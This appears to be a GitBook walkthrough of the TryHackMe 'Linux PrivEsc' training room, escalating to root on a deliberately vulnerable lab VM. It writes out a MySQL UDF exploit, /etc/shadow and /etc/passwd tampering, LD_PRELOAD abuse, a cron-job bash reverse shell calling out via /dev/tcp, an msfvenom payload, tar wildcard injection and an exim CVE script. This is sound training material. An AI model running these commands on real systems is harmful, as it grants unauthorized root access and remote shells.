@@ -1,0 +1,328 @@
+# 7 - Linux PrivEsc
+
+Room Link --> [https://tryhackme.com/room/linuxprivesc](https://tryhackme.com/room/linuxprivesc)
+
+The password for the "user" account is "password321".
+
+SSH Login --> `ssh -oHostKeyAlgorithms=+ssh-dss user@10.10.175.212`&#x20;
+
+### 1 - Service Exploits
+
+The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
+
+Change into the /home/user/tools/mysql-udf directory:  `cd /home/user/tools/mysql-udf`
+
+Compile the raptor\_udf2.c exploit code using the following commands:
+
+`gcc -g -c raptor_udf2.c -fPIC`\
+`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`
+
+Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do\_system" using our compiled exploit:
+
+`use mysql;`\
+`create table foo(line blob);`\
+`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`\
+`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`\
+`create function do_system returns integer soname 'raptor_udf2.so';`
+
+Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
+
+`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
+
+Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+
+`/tmp/rootbash -p`
+
+Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!
+
+`rm /tmp/rootbash`\
+`exit`
+
+### 2 - Weak File Permissions - Readable /etc/shadow
+
+Note that the /etc/shadow file on the VM is world-readable:
+
+`ls -l /etc/shadow`
+
+View the contents of the /etc/shadow file:
+
+`cat /etc/shadow`
+
+Use `unshadow password_file.txt shadow_file.txt` - to create a crackable format for john to crack.
+
+### 3 - Weak File Permissions - Writable /etc/shadow
+
+Note that the /etc/shadow file on the VM is world-writable:
+
+`ls -l /etc/shadow`
+
+Since we can write to it, and also identify the hashing algorithm type as "sha512crypt" we can easily create a password in "sha512" hash format and write it to the shadow file for the "user" user.
+
+`mkpasswd -m sha-512 newpassword` - create a password in hash format (sha512).
+
+Then Edit the /etc/shadow file and replace the original root user's password hash with the newly created hash.
+
+### 4 - Weak File Permissions - Writable /etc/passwd
+
+The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.
+
+Note that the /etc/passwd file is world-writable:
+
+`ls -l /etc/passwd`
+
+Generate a new password hash with a password of your choice:
+
+`openssl passwd newpasswordhere`
+
+Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+
+Switch to the root user, using the new password:
+
+`su root`
+
+Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").\
+
+
+Now switch to the newroot user, using the new password:
+
+`su newroot`
+
+### 5 - Sudo - Shell Escape Sequences
+
+List the programs which sudo allows our user to run:
+
+`sudo -l`
+
+Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
+
+### 6 - Sudo - Environment Variables
+
+Sudo can be configured to inherit certain environment variables from the user's environment.
+
+Check which environment variables are inherited (look for the env\_keep options):
+
+`sudo -l`
+
+<figure><img src=".gitbook/assets/image (50).png" alt=""><figcaption><p>1</p></figcaption></figure>
+
+LD\_PRELOAD and LD\_LIBRARY\_PATH are both inherited from the user's environment. <mark style="color:green;">**LD\_PRELOAD**</mark> loads a shared object before any others when a program is run. <mark style="color:red;">**LD\_LIBRARY\_PATH**</mark> provides a list of directories where shared libraries are searched for first.
+
+#### Shared Object (LD\_PRELOAD)
+
+Create a shared object using the code located at "/home/user/tools/sudo/preload.c":
+
+<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption><p>2</p></figcaption></figure>
+
+`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`
+
+Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD\_PRELOAD environment variable to the full path of the new shared object:
+
+`sudo LD_PRELOAD=/tmp/preload.so /usr/bin/nmap` -&#x20;
+
+<figure><img src=".gitbook/assets/image (52).png" alt=""><figcaption><p>3</p></figcaption></figure>
+
+And we get root!
+
+#### Shared Libraries (LD\_LIBRARY\_PATH)
+
+Run `ldd` against the apache2 program file to see which shared libraries are used by the program:
+
+`ldd /usr/sbin/apache2`
+
+<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption><p>4</p></figcaption></figure>
+
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c:
+
+<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption><p>5</p></figcaption></figure>
+
+`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`
+
+Run apache2 using sudo, while settings the LD\_LIBRARY\_PATH environment variable to /tmp (where we output the compiled shared object):
+
+`sudo LD_LIBRARY_PATH=/tmp apache2`
+
+<figure><img src=".gitbook/assets/image (55).png" alt=""><figcaption><p>6</p></figcaption></figure>
+
+### 7 - Cron Jobs - File Permissions
+
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
+
+View the contents of the system-wide crontab:
+
+`cat /etc/crontab`
+
+There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
+
+Locate the full path of the overwrite.sh file:
+
+`locate overwrite.sh`
+
+Note that the file is world-writable:
+
+`ls -l /usr/local/bin/overwrite.sh`
+
+Since it's writable, we can replace its content with a malicious code. In this case "a rev shell"&#x20;
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/10.18.88.214/4444 0>&1
+
+# listener
+nc -nvlp 4444
+
+# we should get root after 1 minute.
+```
+
+<figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption><p>1</p></figcaption></figure>
+
+### 8 - Cron Jobs - PATH Environment Variable
+
+View the contents of the system-wide crontab:
+
+`cat /etc/crontab`
+
+Note that the PATH variable starts with /home/user which is our user's home directory.
+
+Create a file called overwrite.sh in your home directory with the following contents:
+
+```bash
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+
+Make sure that the file is executable:
+
+`chmod +x /home/user/overwrite.sh`
+
+Wait for the cron job to run (should not take longer than a minute). Run the `/tmp/rootbash`  command with -p to gain a shell running with root privileges:
+
+`/tmp/rootbash -p`
+
+### 9 - Cron Jobs - WildCards
+
+View the contents of the other cron job script:
+
+`cat /usr/local/bin/compress.sh`
+
+Note that the tar command is being run with a wildcard (\*) in your home directory.
+
+Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.
+
+Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
+
+`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
+
+Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
+
+`chmod +x /home/user/shell.elf`
+
+Create these two files in /home/user:
+
+`touch /home/user/--checkpoint=1`\
+`touch /home/user/--checkpoint-action=exec=shell.elf`
+
+When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+
+`nc -nvlp 4444`
+
+We get root after 1minute.
+
+### 10 - SUID / SGID Executables - Known Exploits
+
+Find all the SUID/SGID executables on the Debian VM:
+
+`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
+
+Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!
+
+A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at /home/user/tools/suid/exim/cve-2016-1531.sh.
+
+Run the exploit script to gain a root shell:
+
+`/home/user/tools/suid/exim/cve-2016-1531.sh`
+
+### 11 - SUID / SGID Executables - Shared Object Injection
+
+\
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
